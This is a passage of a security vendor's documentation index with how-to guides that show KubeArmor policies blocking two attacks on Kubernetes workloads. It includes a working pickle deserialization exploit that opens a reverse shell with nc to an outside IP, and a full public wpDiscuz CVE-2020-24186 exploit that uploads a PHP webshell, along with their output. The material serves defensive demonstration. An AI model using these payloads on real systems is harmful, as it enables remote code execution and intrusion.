https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash ` Once the command is run successfully it will install the following components to your cluster: KubeArmor protection engine Cilium CNI Auto policy discovery engine MySQL database to keep discovered policies Hubble Relay and KubeArmor Relay Once this is down we can invoke the second script file which will download the auto-discovered policies from the MySQL database and store them locally. For this we will issue the below command: curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash ` You should be able to see the following output. Got 1 cilium policies in file cilium_policies.yaml Got 1 kubearmor policies in file kubearmor_policies_default_explorer_knoxautopolicy_fxbpvndp.yaml Got 1 kubearmor policies in file kubearmor_policies_default_explorer_mysql_xaqsryye.yaml Got 1 kubearmor policies in file kubearmor_policies_default_python-ms_pickle-app_engncdqs.yaml` In mere seconds after installing executing auto policy discovery tool, it generated 1 Cilium policy and 3 curated KubeArmor policies. Let us take a look at some of the autodiscovery policies Cilium Policy apiVersion: cilium.io/v2 kind: CiliumNetworkPolicy metadata: name: autopol-egress-fdjkltpvf namespace: default spec: endpointSelector: matchLabels: app: pickle-app ingress: - fromEndpoints: toPorts: - ports: - port: \"80\" protocol: TCP KubeArmor Policy apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: autopol-system-269415943 namespace: default spec: severity: 1 selector: matchLabels: app: pickle-app file: matchPaths: - path: /app/templates/index.html fromSource: - path: /usr/bin/python3.8 - path: /app/templates/layout.html fromSource: - path: /usr/bin/python3.8 - path: /app/templates/uploads.html fromSource: - path: /usr/bin/python3.8 - path: /usr/lib/python3.8/encodings/__pycache__/unicode_escape.cpython-38.pyc fromSource: - path: /usr/bin/python3.8 action: Allow Note Policy name will change according to environment We also have predefined policies in the policy-template GitHub repository which can be utilized to achieve the same level of runtime security without having to generate autodiscovery policies. The only point to remember is that you need to know the namespace and labels for your Python workloads","title":"Auto Policy Discovery for your Python microservice"},{"location":"how-to/protect-python-microservice/#the-policies-in-action","text":"It is time to verify whether we were able to achieve zero trust by using the auto-discovered policies generated by AccuKnox opensource tools. To test this we will scan the application with some popular scanners. Before that let us verify that the policies are applied correctly to the cluster kubectl get cnp,ksp -A NAMESPACE NAME AGE default ciliumnetworkpolicy.cilium.io/autopol-egress-fdjkltpvf 15m NAMESPACE NAME AGE default kubearmorpolicy.security.kubearmor.com/autopol-system-269415943 14m","title":"The Policies in-action"},{"location":"how-to/protect-python-microservice/#initiating-the-attack-scenario","text":"By using Burpsuite as initial recon, we were able to determine that it is running on a python server and the API name gave away that it uses the pickle module. We\u2019ll make use of the pickle module and write a python exploit that lets us create a reverse shell onto the pod. Create a python file and name it exploit.py and then we'll create our class RCE and let its reduce method return a tuple of arguments for the callable object. import pickle import base64 import os class RCE : def __reduce__ ( self ): cmd = ( 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | nc 34.125.245.75 4444 > /tmp/f' ) return os . system , ( cmd ,) if __name__ == '__main__' : pickled = pickle . dumps ( RCE ()) with open ( 'parrot.pkl' , 'wb' ) as f : pickle . dump ( RCE (), f ) print ( base64 . urlsafe_b64encode ( pickled )) Our callable will be os.system and the argument will be a common reverse shell snippet using a named pipe. Let's create a .pkl file and upload it to the application via UI. Before executing let's take a look at the exploit file itself. cat exploit . py import pickle import base64 import os class RCE : def __reduce__ ( self ): cmd = ( 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh 2>&1 1 nc 34.125.245.75 4444 > /tmp/f' ) return os . system , ( cmd ,) if name == '__main__'' pickled = pickle . dumps ( RCE ()) with open ( 'parrotl.pkl' , 'wb'') as f: pickle . dump ( RCE (), f ) print ( base64 . urlsafe_b64encode ( pickled )) Time to create our python exploit payload. python3 exploit.py b 'gA5VcgAAAAAAAACMBXByc2l4lIwGc3lzdUtlJOUjEdyb5AydGlwL2Y7IG1r2mlmbyAydGlwL2Y7IGNhdCAydGlwL2YgfC 1wL2aUliZR5lC4=' We will use nc -lnvp 4444 command to listen to incoming connection on port 4444. nc -lnvp 4444 listening on [ any ] 4444 ... We\u2019ll go to http://34.123.162.173/upload_pickle and upload the exploit file parrot.pkl which we created earlier. We\u2019ll get a success message file upload successfully without a reverse shell opened on the listener machine. nc -lnvp 4444 listening on [ any ] 4444 ...","title":"Initiating the Attack scenario"},{"location":"how-to/protect-python-microservice/#checking-the-policy-logs-on-kubearmor","text":"To check how to do it, kindly go through our help section Blocked Log Created by KubeArmor { \"timestamp\" : 1638223573 , \"updatedTime\" : \"2021-11-29T22:06:13.493285Z\" , \"hostName\" : \"gke-sample-cluster-default-pool-3be49535-k4cp\" , \"namespaceName\" : \"default\" , \"podName\" : \"pickle-app-6d8c67b4f6-fk2qs\" , \"containerID\" : \"9e57f01622b423e04bb2071d54f95dca2044a3f8467e897c5b696307a6080be7\" , \"containerName\" : \"pickle-app\" , \"hostPid\" : 1158108 , \"ppid\" : 370 , \"pid\" : 371 , \"uid\" : 0 , \"policyName\" : \"autopol-system-269415943\" , \"severity\" : \"1\" , \"type\" : \"MatchedPolicy\" , \"source\" : \"python3\" , \"operation\" : \"Process\" , \"resource\" : \"/bin/sh -c rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 34.125.245.75 4444 > /tmp/f\" , \"data\" : \"syscall=SYS_EXECVE\" , \"action\" : \"Block\" , \"result\" : \"Permission denied\" } Now let us delete the policies which we applied after auto discovering and run the scenario once more kubectl apply delete cnp,ksp --all ciliumnetworkpolicy.cilium.io \"autopol-egress-fdjkltpvf\" deleted kubearmorpolicy.security.kubearmor.com \"autopol-system-269415943\" deleted We\u2019ll go to http://34.123.162.173/upload_pickle and upload the same exploit file parrot.pkl The moment we upload the parrot.pkl file we will get a reverse shell opened on the listener machine. nc -lnvp 4444 listening on [ any ] 4444 ... connect to [ 10 .182.0.13 ] from ( UNKNOWN ) [ 35 .184.238.249 ] 38292 /bin/sh: 0 : can ' t access tty ; job control turned off # whoami root #hostname pickle-app-7f7fbdb76b-64mq5 We could see that the attack happened after we deleted the policies which were auto-discovered in a safe environment. This means applying the auto-discovered policies ensured that the workload had been protected at runtime.","title":"Checking the policy logs on KubeArmor"},{"location":"how-to/protect-python-microservice/#accuknoxs-policy-templates-repository","text":"AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit policy-templates to download and apply policies.","title":"AccuKnox's policy templates repository"},{"location":"how-to/protect-python-microservice/#conclusion","text":"Insecure deserialization is very difficult to identify while conducting security tests. Insecure deserialization can be prevented by going through the source code for the vulnerable code base and by input validation and output sanitization. Insecure deserialization in conjunction with a Remote Code Execution (RCE) will undoubtedly compromise the entire infrastructure. Using KubeArmor, an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.","title":"Conclusion"},{"location":"how-to/protect-wordpress-application/","text":"The modern content management system (CMS) has made website creation easier than ever. By utilizing the right platform, you will have access to features that can make the process much simpler. Introduction \u00b6 The modern Content Management System (CMS) has made website creation easier than ever. By utilizing the right platform, you will have access to features that can make the process much simpler. There are plenty of CMS to choose from, however, each with its advantages and drawbacks. In this section, we\u2019ll be talking about a critical vulnerability found in the WordPress plugin wpDiscuz . The wpDiscuz is a plugin designed to create responsive comment areas on WordPress installations. It allows users to discuss topics and easily personalize their feedback with a rich text editor. AccuKnox provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected with AccuKnox. What are we trying to achieve? \u00b6 In the last revision of the wpDiscuz plugin, releases 7. x. x, they added the ability to include image attachments in the comments that are uploaded to the website and included in the comments. Unfortunately, there was no security protection associated with the implementation of this feature, creating a critical vulnerability. wpDiscuz comments were designed to allow only image attachments. However, due to the file mime type detection functions that were used, the file type verification could easily be bypassed, allowing unauthenticated users the ability to upload any type of file, including PHP files. We will be taking a look at how to mimic the exploit and how we can use KubeArmor runtime security policies to defend from the attack without compromising the use of the plugin. Score: 10 CRITICAL Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Attack Vector: NETWORK Attack Complexity: LOW Privileges Required: NONE User Interaction: NONE Scope: CHANGED Confidentiality: HIGH Integrity: HIGH Availability: HIGH We\u2019ll deploy the WordPress application on Kubernetes and install wpDiscuz on it. Get the external IP of the application to access the same. For this, we have created a complete YAML for WordPress installation on Kubernetes. You can use this predefined deployment file to quickly deploy WordPress to your Kubernetes environment. kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/wordpress-demo/k8s-wordpress.yaml kubectl get pod -n wordpress-mysql NAME READY STATUS RESTARTS AGE wordpress-5d5d448dcc-52mcj 1 /1 Running 0 4d10h wordpress-mysql-7757f9f8c8-2j8wm 1 /1 Running 0 4d9h kubectl get svc -n wordpress-mysql NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) wordpress LoadBalancer 10 .16.12.13 35 .232.52.87 80 :31790/TCP wordpress-mysql ClusterIP None <none> 3306 /TCP Here the external IP is http://35.232.52.87/ Initiating the Attack \u00b6 Go to http://35.232.52.87/2021/12/16/hello-world/ and create a comment. With a simple inspect of the webpage, we can see that WordPress is using wpDiscuz in it to create responsive comments. Here, replace 35.232.52.87 from your own IP. With the URL in hand, we\u2019ll try to exploit the application by uploading a PHP code into the server and thereby granting us RCE. To make this happen we use a public exploit for the wpDiscuz vulnerability. #!/bin/python3 # Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Unauthenticated Remote Code Execution # Google Dork: N/A # Date: 2021/06/08 # Exploit Author: Fellipe Oliveira # Vendor Homepage: https://gvectors.com/ # Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip # Version: wpDiscuz 7.0.4 # Tested on: Debian9, Windows 7, Windows 10 (Wordpress 5.7.2) # CVE : CVE-2020-24186 # Thanks for the great contribution to the code: Z3roC00l (https://twitter.com/zeroc00I) import requests import optparse import re import random import time import string import json parser = optparse . OptionParser () parser . add_option ( '-u' , '--url' , action = \"store\" , dest = \"url\" , help = \"Base target host: http://192.168.1.81/blog\" ) parser . add_option ( '-p' , '--path' , action = \"store\" , dest = \"path\" , help = \"Path to exploitation: /2021/06/blogpost\" ) options , args = parser . parse_args () if not options . url or not options . path : print ( '[+] Specify an url target' ) print ( '[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost' ) print ( '[+] Example help usage: exploit.py -h' ) exit () session = requests . Session () main_url = options . url path = options . path url_blog = main_url + path clean_host = main_url . replace ( 'http://' , '' ) . replace ( '/wordpress' , '' ) def banner (): print ( '---------------------------------------------------------------' ) print ( '[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution' ) print ( '[-] File Upload Bypass Vulnerability - PHP Webshell Upload' ) print ( '[-] CVE: CVE-2020-24186' ) print ( '[-] https://github.com/hevox' ) print ( '--------------------------------------------------------------- \\n ' ) def csrfRequest (): global wmuSec global wc_post_id try : get_html = session . get ( url_blog ) response_len = str ( len ( get_html . text )) response_code = str ( get_html . status_code ) print ( '[+] Response length:[' + response_len + '] | code:[' + response_code + ']' ) raw_wmu = get_html . text . replace ( ',' , ' \\n ' ) wmuSec = re . findall ( 'wmuSecurity.*$' , raw_wmu , re . MULTILINE )[ 0 ] . split ( '\"' )[ 2 ] print ( '[!] Got wmuSecurity value: ' + wmuSec + '' ) raw_postID = get_html . text . replace ( ',' , ' \\n ' ) wc_post_id = re . findall ( 'wc_post_id.*$' , raw_postID , re . MULTILINE )[ 0 ] . split ( '\"' )[ 2 ] print ( '[!] Got wmuSecurity value: ' + wc_post_id + ' \\n ' ) except requests . exceptions . HTTPError as err : print ( ' \\n [x] Failed to Connect in: ' + url_blog + ' ' ) print ( '[x] This host seems to be Down' ) exit () def nameRandom (): global shell_name print ( '[+] Generating random name for Webshell...' ) shell_name = '' . join (( random . choice ( string . ascii_lowercase ) for x in range ( 15 ))) time . sleep ( 1 ) print ( '[!] Generated webshell name: ' + shell_name + ' \\n ' ) return shell_name def shell_upload (): global shell print ( '[!] Trying to Upload Webshell..' ) try : upload_url = main_url + \"/wp-admin/admin-ajax.php\" upload_cookies = { \"wordpress_test_cookie\" : \"WP%20Cookie %20c heck\" , \"wpdiscuz_hide_bubble_hint\" : \"1\" } upload_headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\" , \"Accept\" : \"*/*\" , \"Accept-Language\" : \"pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"X-Requested-With\" : \"XMLHttpRequest\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------2032192841253859011643762941\" , \"Origin\" : \"http://\" + clean_host + \"\" , \"Connection\" : \"close\" , \"Referer\" : url_blog } upload_data = \"-----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" action \\\"\\r\\n\\r\\n wmuUploadFiles \\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmu_nonce \\\"\\r\\n\\r\\n \" + wmuSec + \" \\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmuAttachmentsData \\\"\\r\\n\\r\\n\\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmu_files[0] \\\" ; filename= \\\" \" + shell_name + \".php \\\"\\r\\n Content-Type: image/png \\r\\n\\r\\n GIF689a; \\r\\n\\r\\n <?php system($_GET['cmd']); ?> \\r\\n\\x1a\\x82\\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" postId \\\"\\r\\n\\r\\n \" + wc_post_id + \" \\r\\n -----------------------------2032192841253859011643762941-- \\r\\n \" check = session . post ( upload_url , headers = upload_headers , cookies = upload_cookies , data = upload_data ) json_object = ( json . loads ( check . text )) status = ( json_object [ \"success\" ]) get_path = ( check . text . replace ( ',' , ' \\n ' )) shell_pret = re . findall ( 'url.*$' , get_path , re . MULTILINE ) find_shell = str ( shell_pret ) raw = ( find_shell . replace ( ' \\\\ ' , '' ) . replace ( 'url&quot;:&quot;' , '' ) . replace ( ' \\' ,' , '' ) . replace ( '&quot;' , '' ) . replace ( '[ \\' ' , '' )) shell = ( raw . split ( \" \" , 1 )[ 0 ]) if status == True : print ( '[+] Upload Success... Webshell path:' + shell + ' \\n ' ) else : print ( '[x] Failed to Upload Webshell in: ' + url_blog + ' ' ) exit () except requests . exceptions . HTTPError as conn : print ( '[x] Failed to Upload Webshell in: ' + url_blog + ' ' ) return shell def code_exec (): try : while True : cmd = input ( '> ' ) codex = session . get ( shell + '?cmd=' + cmd + '' ) print ( codex . text . replace ( 'GIF689a;' , '' ) . replace ( '\ufffd' , '' )) except : print ( ' \\n [x] Failed to execute PHP code...' ) banner () csrfRequest () nameRandom () shell_upload () code_exec () This python code requires the URL to the WordPress site and the blogpost endpoint. We\u2019ll get both of these from the UI. python3 exploit.py -u http://35.232.52.87/ -p /2021/12/16/hello-world The command will upload an arbitrary PHP file with <?php system($_GET['cmd']); ?> and then access this file to trigger execution on the server, thereby achieving remote code execution. --------------------------------------------------------------- [ - ] Wordpress Plugin wpDiscuz 7 .0.4 - Remote Code Execution [ - ] File Upload Bypass Vulnerability - PHP Webshell Upload [ - ] CVE: CVE-2020-24186 [ - ] https://github.com/hevox --------------------------------------------------------------- [ + ] Response length: [ 101559 ] | code: [ 200 ] [ ! ] Got wmuSecurity value: fbf0656b17 [ ! ] Got wmuSecurity value: 1 [ + ] Generating random name for Webshell... [ ! ] Generated webshell name: bmrorpjvojkbbko [ ! ] Trying to Upload Webshell.. [ + ] Upload Success... Webshell path:http://35.232.52.87/wp-content/uploads/2021/12/bmrorpjvojkbbko-1640016084.4304.php > hostname wordpress-5d5d448dcc-52mcj > Defending against the Attack \u00b6 In order to defend against the attack, we dig a little deeper and found the root cause to be the \" unrestricted file upload \" when coupled with double extensions (e.g., \".php.gif\") bypassed sanity checks. To resolve the vulnerability you can update wpDiscuz to version 7.0.5+ by experiencing downtime or use KubeArmor\u2019s pre-tailored policy to remove the vulnerability even without changing anything. About the Policy: # KubeArmor is an open source software that enables you to protect your cloud workload at runtime. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-cve-2020-24186-deny-wordpress-rce namespace: wordpress-mysql # Change your namespace spec: tags: [\"CVE\", \"WordPress-RCE\", \"CVE-2020-24186\"] message: \"Alert! *.php file upload to wp-content subdirectory detected\" selector: matchLabels: app: wordpress #change this label with your label file: severity: 5 matchPatterns: - pattern: /var/www/html/wp-content/uploads/**/*.php - pattern: /var/www/html/wp-content/uploads/**/*.sh action: Block You can simply take advantage of our open-source GitHub inventory, and apply Policy directly from there: kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml Checking the policy logs on KubeArmor \u00b6 To check how to do it, kindly go through our help section . Blocked Policy Log Created by KubeArmor { \"timestamp\" : 1640059272 , \"updatedTime\" : \"2021-12-21T04:01:12.676169Z\" , \"hostName\" : \"gke-cys-poc-default-pool-3be49535-k4cp\" , \"namespaceName\" : \"wordpress-mysql\" , \"podName\" : \"wordpress-5d5d448dcc-52mcj\" , \"containerID\" : \"9d477215d2288de4cd5ff63f387a808fe1bf3663d130362bebf33c546427e09c\" , \"containerName\" : \"wordpress\" , \"hostPid\" : 3863212 , \"ppid\" : 1 , \"pid\" : 120 , \"uid\" : 33 , \"type\" : \"ContainerLog\" , \"source\" : \"apache2\" , \"operation\" : \"File\" , \"resource\" : \"/var/www/html/wp-content/uploads/2021/12/xjeyirtptddiemf-1640059272.6737.php\" , \"data\" : \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_TRUNC\" , \"result\" : \"Permission denied\" } AccuKnox's policy templates repository \u00b6 AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit policy-templates to download and apply policy policies. Conclusion \u00b6 In this post, we detailed a flaw in wpDiscuz that provided unauthenticated users with the ability to upload arbitrary files, including PHP files, and execute those files on the server. Thus leading to an RCE and resource hijacking. Using KubeArmor , an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.","title":"How to protect WordPress application using AccuKnox"},{"location":"how-to/protect-wordpress-application/#introduction","text":"The modern Content Management System (CMS) has made website creation easier than ever. By utilizing the right platform, you will have access to features that can make the process much simpler. There are plenty of CMS to choose from, however, each with its advantages and drawbacks. In this section, we\u2019ll be talking about a critical vulnerability found in the WordPress plugin wpDiscuz . The wpDiscuz is a plugin designed to create responsive comment areas on WordPress installations. It allows users to discuss topics and easily personalize their feedback with a rich text editor. AccuKnox provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected with AccuKnox.","title":"Introduction"},{"location":"how-to/protect-wordpress-application/#what-are-we-trying-to-achieve","text":"In the last revision of the wpDiscuz plugin, releases 7. x. x, they added the ability to include image attachments in the comments that are uploaded to the website and included in the comments. Unfortunately, there was no security protection associated with the implementation of this feature, creating a critical vulnerability. wpDiscuz comments were designed to allow only image attachments. However, due to the file mime type detection functions that were used, the file type verification could easily be bypassed, allowing unauthenticated users the ability to upload any type of file, including PHP files. We will be taking a look at how to mimic the exploit and how we can use KubeArmor runtime security policies to defend from the attack without compromising the use of the plugin. Score: 10 CRITICAL Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Attack Vector: NETWORK Attack Complexity: LOW Privileges Required: NONE User Interaction: NONE Scope: CHANGED Confidentiality: HIGH Integrity: HIGH Availability: HIGH We\u2019ll deploy the WordPress application on Kubernetes and install wpDiscuz on it. Get the external IP of the application to access the same. For this, we have created a complete YAML for WordPress installation on Kubernetes. You can use this predefined deployment file to quickly deploy WordPress to your Kubernetes environment. kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/wordpress-demo/k8s-wordpress.yaml kubectl get pod -n wordpress-mysql NAME READY STATUS RESTARTS AGE wordpress-5d5d448dcc-52mcj 1 /1 Running 0 4d10h wordpress-mysql-7757f9f8c8-2j8wm 1 /1 Running 0 4d9h kubectl get svc -n wordpress-mysql NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) wordpress LoadBalancer 10 .16.12.13 35 .232.52.87 80 :31790/TCP wordpress-mysql ClusterIP None <none> 3306 /TCP Here the external IP is http://35.232.52.87/","title":"What are we trying to achieve?"},{"location":"how-to/protect-wordpress-application/#initiating-the-attack","text":"Go to http://35.232.52.87/2021/12/16/hello-world/ and create a comment. With a simple inspect of the webpage, we can see that WordPress is using wpDiscuz in it to create responsive comments. Here, replace 35.232.52.87 from your own IP. With the URL in hand, we\u2019ll try to exploit the application by uploading a PHP code into the server and thereby granting us RCE. To make this happen we use a public exploit for the wpDiscuz vulnerability. #!/bin/python3 # Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Unauthenticated Remote Code Execution # Google Dork: N/A # Date: 2021/06/08 # Exploit Author: Fellipe Oliveira # Vendor Homepage: https://gvectors.com/ # Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip # Version: wpDiscuz 7.0.4 # Tested on: Debian9, Windows 7, Windows 10 (Wordpress 5.7.2) # CVE : CVE-2020-24186 # Thanks for the great contribution to the code: Z3roC00l (https://twitter.com/zeroc00I) import requests import optparse import re import random import time import string import json parser = optparse . OptionParser () parser . add_option ( '-u' , '--url' , action = \"store\" , dest = \"url\" , help = \"Base target host: http://192.168.1.81/blog\" ) parser . add_option ( '-p' , '--path' , action = \"store\" , dest = \"path\" , help = \"Path to exploitation: /2021/06/blogpost\" ) options , args = parser . parse_args () if not options . url or not options . path : print ( '[+] Specify an url target' ) print ( '[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost' ) print ( '[+] Example help usage: exploit.py -h' ) exit () session = requests . Session () main_url = options . url path = options . path url_blog = main_url + path clean_host = main_url . replace ( 'http://' , '' ) . replace ( '/wordpress' , '' ) def banner (): print ( '---------------------------------------------------------------' ) print ( '[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution' ) print ( '[-] File Upload Bypass Vulnerability - PHP Webshell Upload' ) print ( '[-] CVE: CVE-2020-24186' ) print ( '[-] https://github.com/hevox' ) print ( '--------------------------------------------------------------- \\n ' ) def csrfRequest (): global wmuSec global wc_post_id try : get_html = session . get ( url_blog ) response_len = str ( len ( get_html . text )) response_code = str ( get_html . status_code ) print ( '[+] Response length:[' + response_len + '] | code:[' + response_code + ']' ) raw_wmu = get_html . text . replace ( ',' , ' \\n ' ) wmuSec = re . findall ( 'wmuSecurity.*$' , raw_wmu , re . MULTILINE )[ 0 ] . split ( '\"' )[ 2 ] print ( '[!] Got wmuSecurity value: ' + wmuSec + '' ) raw_postID = get_html . text . replace ( ',' , ' \\n ' ) wc_post_id = re . findall ( 'wc_post_id.*$' , raw_postID , re . MULTILINE )[ 0 ] . split ( '\"' )[ 2 ] print ( '[!] Got wmuSecurity value: ' + wc_post_id + ' \\n ' ) except requests . exceptions . HTTPError as err : print ( ' \\n [x] Failed to Connect in: ' + url_blog + ' ' ) print ( '[x] This host seems to be Down' ) exit () def nameRandom (): global shell_name print ( '[+] Generating random name for Webshell...' ) shell_name = '' . join (( random . choice ( string . ascii_lowercase ) for x in range ( 15 ))) time . sleep ( 1 ) print ( '[!] Generated webshell name: ' + shell_name + ' \\n ' ) return shell_name def shell_upload (): global shell print ( '[!] Trying to Upload Webshell..' ) try : upload_url = main_url + \"/wp-admin/admin-ajax.php\" upload_cookies = { \"wordpress_test_cookie\" : \"WP%20Cookie %20c heck\" , \"wpdiscuz_hide_bubble_hint\" : \"1\" } upload_headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\" , \"Accept\" : \"*/*\" , \"Accept-Language\" : \"pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"X-Requested-With\" : \"XMLHttpRequest\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------2032192841253859011643762941\" , \"Origin\" : \"http://\" + clean_host + \"\" , \"Connection\" : \"close\" , \"Referer\" : url_blog } upload_data = \"-----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" action \\\"\\r\\n\\r\\n wmuUploadFiles \\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmu_nonce \\\"\\r\\n\\r\\n \" + wmuSec + \" \\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmuAttachmentsData \\\"\\r\\n\\r\\n\\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" wmu_files[0] \\\" ; filename= \\\" \" + shell_name + \".php \\\"\\r\\n Content-Type: image/png \\r\\n\\r\\n GIF689a; \\r\\n\\r\\n <?php system($_GET['cmd']); ?> \\r\\n\\x1a\\x82\\r\\n -----------------------------2032192841253859011643762941 \\r\\n Content-Disposition: form-data; name= \\\" postId \\\"\\r\\n\\r\\n \" + wc_post_id + \" \\r\\n -----------------------------2032192841253859011643762941-- \\r\\n \" check = session . post ( upload_url , headers = upload_headers , cookies = upload_cookies , data = upload_data ) json_object = ( json . loads ( check . text )) status = ( json_object [ \"success\" ]) get_path = ( check . text . replace ( ',' , ' \\n ' )) shell_pret = re . findall ( 'url.*$' , get_path , re . MULTILINE ) find_shell = str ( shell_pret ) raw = ( find_shell . replace ( ' \\\\ ' , '' ) . replace ( 'url&quot;:&quot;' , '' ) . replace ( ' \\' ,' , '' ) . replace ( '&quot;' , '' ) . replace ( '[ \\' ' , '' )) shell = ( raw . split ( \" \" , 1 )[ 0 ]) if status == True : print ( '[+] Upload Success... Webshell path:' + shell + ' \\n ' ) else : print ( '[x] Failed to Upload Webshell in: ' + url_blog + ' ' ) exit () except requests . exceptions . HTTPError as conn : print ( '[x] Failed to Upload Webshell in: ' + url_blog + ' ' ) return shell def code_exec (): try : while True : cmd = input ( '> ' ) codex = session . get ( shell + '?cmd=' + cmd + '' ) print ( codex . text . replace ( 'GIF689a;' , '' ) . replace ( '\ufffd' , '' )) except : print ( ' \\n [x] Failed to execute PHP code...' ) banner () csrfRequest () nameRandom () shell_upload () code_exec () This python code requires the URL to the WordPress site and the blogpost endpoint. We\u2019ll get both of these from the UI. python3 exploit.py -u http://35.232.52.87/ -p /2021/12/16/hello-world The command will upload an arbitrary PHP file with <?php system($_GET['cmd']); ?> and then access this file to trigger execution on the server, thereby achieving remote code execution. --------------------------------------------------------------- [ - ] Wordpress Plugin wpDiscuz 7 .0.4 - Remote Code Execution [ - ] File Upload Bypass Vulnerability - PHP Webshell Upload [ - ] CVE: CVE-2020-24186 [ - ] https://github.com/hevox --------------------------------------------------------------- [ + ] Response length: [ 101559 ] | code: [ 200 ] [ ! ] Got wmuSecurity value: fbf0656b17 [ ! ] Got wmuSecurity value: 1 [ + ] Generating random name for Webshell... [ ! ] Generated webshell name: bmrorpjvojkbbko [ ! ] Trying to Upload Webshell.. [ + ] Upload Success... Webshell path:http://35.232.52.87/wp-content/uploads/2021/12/bmrorpjvojkbbko-1640016084.4304.php > hostname wordpress-5d5d448dcc-52mcj >","title":"Initiating the Attack"},{"location":"how-to/protect-wordpress-application/#defending-against-the-attack","text":"In order to defend against the attack, we dig a little deeper and found the root cause to be the \" unrestricted file upload \" when coupled with double extensions (e.g., \".php.gif\") bypassed sanity checks. To resolve the vulnerability you can update wpDiscuz to version 7.0.5+ by experiencing downtime or use KubeArmor\u2019s pre-tailored policy to remove the vulnerability even without changing anything. About the Policy: # KubeArmor is an open source software that enables you to protect your cloud workload at runtime. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: ksp-cve-2020-24186-deny-wordpress-rce namespace: wordpress-mysql # Change your namespace spec: tags: [\"CVE\", \"WordPress-RCE\", \"CVE-2020-24186\"] message: \"Alert! *.php file upload to wp-content subdirectory detected\" selector: matchLabels: app: wordpress #change this label with your label file: severity: 5 matchPatterns: - pattern: /var/www/html/wp-content/uploads/**/*.php - pattern: /var/www/html/wp-content/uploads/**/*.sh action: Block You can simply take advantage of our open-source GitHub inventory, and apply Policy directly from there: kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml","title":"Defending against the Attack"},{"location":"how-to/protect-wordpress-application/#checking-the-policy-logs-on-kubearmor","text":"To check how to do it, kindly go through our help section . Blocked Policy Log Created by KubeArmor { \"timestamp\" : 1640059272 , \"updatedTime\" : \"2021-12-21T04:01:12.676169Z\" , \"hostName\" : \"gke-cys-poc-default-pool-3be49535-k4cp\" , \"namespaceName\" : \"wordpress-mysql\" , \"podName\" : \"wordpress-5d5d448dcc-52mcj\" , \"containerID\" : \"9d477215d2288de4cd5ff63f387a808fe1bf3663d130362bebf33c546427e09c\" , \"containerName\" : \"wordpress\" , \"hostPid\" : 3863212 , \"ppid\" : 1 , \"pid\" : 120 , \"uid\" : 33 , \"type\" : \"ContainerLog\" , \"source\" : \"apache2\" , \"operation\" : \"File\" , \"resource\" : \"/var/www/html/wp-content/uploads/2021/12/xjeyirtptddiemf-1640059272.6737.php\" , \"data\" : \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_TRUNC\" , \"result\" : \"Permission denied\" }","title":"Checking the policy logs on KubeArmor"},{"location":"how-to/protect-wordpress-application/#accuknoxs-policy-templates-repository","text":"AccuKnox's policy templates is an 